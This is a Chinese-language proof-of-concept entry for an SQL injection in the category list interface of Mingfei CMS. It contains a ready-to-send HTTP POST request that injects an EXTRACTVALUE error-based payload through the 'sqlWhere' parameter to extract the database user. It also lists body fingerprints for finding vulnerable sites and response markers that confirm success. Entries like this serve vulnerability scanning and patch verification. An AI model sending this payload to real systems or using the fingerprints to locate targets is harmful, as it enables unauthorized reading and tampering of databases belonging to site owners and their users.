﻿# 铭飞CMS category SQL注入漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：铭飞CMS category 接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

> 漏洞特征：body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"

> 验证脚本：HTTP

```
POST /cms/category/list HTTP/1.1
Content-Type: application/x-www-form-urlencoded

sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x5c,0x717a6a6271,(select user()),0x716b6a7871))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
```

> 响应代码特征：500

> 响应内容特征：qzjbqroot

> 上传文件定位：

> 验证文件来源：铭飞CMS category SQL注入漏洞.poc

